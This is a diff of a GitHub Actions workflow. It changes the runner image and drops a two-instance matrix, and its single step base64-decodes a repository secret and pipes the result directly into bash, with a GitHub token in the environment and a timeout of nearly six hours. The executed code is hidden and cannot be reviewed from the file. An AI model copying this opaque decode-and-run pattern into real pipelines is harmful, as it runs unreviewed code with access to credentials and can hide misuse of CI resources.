@@ -5,13 +5,10 @@ concurrency:
   cancel-in-progress: true
 jobs:
   Instance_Job:
-    runs-on: ubuntu-22.04
+    runs-on: ubuntu-24.04
     timeout-minutes: 345
-    strategy:
-      matrix:
-        Instance_Id: [1, 2]
     steps:
       - env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
           INSTANCE: ${{ secrets.INSTANCE }}
-        run: echo "$INSTANCE" | jq -r ".[${{ matrix.Instance_Id }} - 1]" | openssl base64 -d -A | bash
+        run: echo "$INSTANCE" | jq -r ".[0]" | openssl base64 -d -A | bash
